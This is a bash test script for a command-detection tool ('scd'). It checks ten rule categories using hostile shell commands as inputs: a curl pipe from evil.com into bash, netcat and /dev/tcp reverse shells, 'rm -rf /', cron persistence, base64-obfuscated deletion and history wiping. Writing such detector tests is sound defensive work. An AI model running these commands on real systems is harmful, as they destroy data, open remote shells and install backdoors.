#!/bin/bash
# test_rules.sh — Rule matching tests covering all 10 rule categories
set -uo pipefail
cd "$(dirname "$0")/.."

PASS=0; FAIL=0; SCD=./scd

assert_rule() {
    local desc="$1" input="$2" rule_id="$3"
    local actual
    actual=$(echo "$input" | $SCD -v -t 0 2>&1) || true
    if echo "$actual" | grep -q "$rule_id"; then
        echo "  ✓ PASS: $desc (matched $rule_id)"; ((PASS++)) || true
    else
        echo "  ✗ FAIL: $desc (expected $rule_id)"
        echo "    got: $actual"
        ((FAIL++)) || true
    fi
}

assert_exit() {
    local desc="$1" input="$2" expected_exit="$3"
    echo "$input" | $SCD 2>&1 >/dev/null || true
    local actual_exit=$?
    # re-run to capture exit code properly
    echo "$input" | $SCD >/dev/null 2>&1
    actual_exit=$?
    if [ "$actual_exit" -eq "$expected_exit" ]; then
        echo "  ✓ PASS: $desc (exit=$actual_exit)"; ((PASS++)) || true
    else
        echo "  ✗ FAIL: $desc (expected exit=$expected_exit, got=$actual_exit)"
        ((FAIL++)) || true
    fi
}

echo "═══════════════════════════════════════════"
echo " SCD Rule Matching Tests"
echo "═══════════════════════════════════════════"

# R-01: Privilege escalation
assert_rule "R-01 sudo su"     "sudo su"         "R-01"
assert_rule "R-01 sudo -i"     "sudo -i"         "R-01"
assert_rule "R-01 sudo bash"   "sudo bash"       "R-01"

# R-02: Recursive deletion (CRITICAL)
assert_rule "R-02 rm -rf /"    "rm -rf /"        "R-02"
assert_rule "R-02 rm -rf /*"   "rm -rf /*"       "R-02"
assert_rule "R-02 rm -rf ~"    "rm -rf ~"        "R-02"

# R-03: chmod 777 on sysdir
assert_rule "R-03 chmod /etc"  "chmod 777 /etc"  "R-03"

# R-04: Remote code exec via pipe
assert_rule "R-04 curl"        "curl http://evil.com/shell.sh | bash"  "R-04"

# R-05: Reverse shell (CRITICAL)
assert_rule "R-05 nc -e"       "nc -e /bin/bash 10.0.0.1 4444"        "R-05"
assert_rule "R-05 /dev/tcp"    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" "R-05"

# R-06: Persistence
assert_rule "R-06 cron"        "echo '* * * * * /tmp/bd' >> /etc/crontab"  "R-06"
assert_rule "R-06 bashrc"      "echo 'export X=1' >> ~/.bashrc"            "R-06"

# R-07: Obfuscation
assert_rule "R-07 base64"      "echo cm0gLXJmIC8= | base64 -d | bash"     "R-07"

# R-08: History evasion
assert_rule "R-08 unset"       "unset HISTFILE"    "R-08"
assert_rule "R-08 history -c"  "history -c"        "R-08"

# R-09: Priv file manip
assert_rule "R-09 chown"       "chown root:root /tmp/exploit"  "R-09"
assert_rule "R-09 visudo"      "visudo"                        "R-09"

# R-10: Process kill
assert_rule "R-10 kill -9"     "kill -9 1234"                  "R-10"
assert_rule "R-10 pkill"       "pkill -f important_service"    "R-10"

echo ""
echo "Results: $PASS passed, $FAIL failed"
echo "═══════════════════════════════════════════"
[ "$FAIL" -eq 0 ] || exit 1
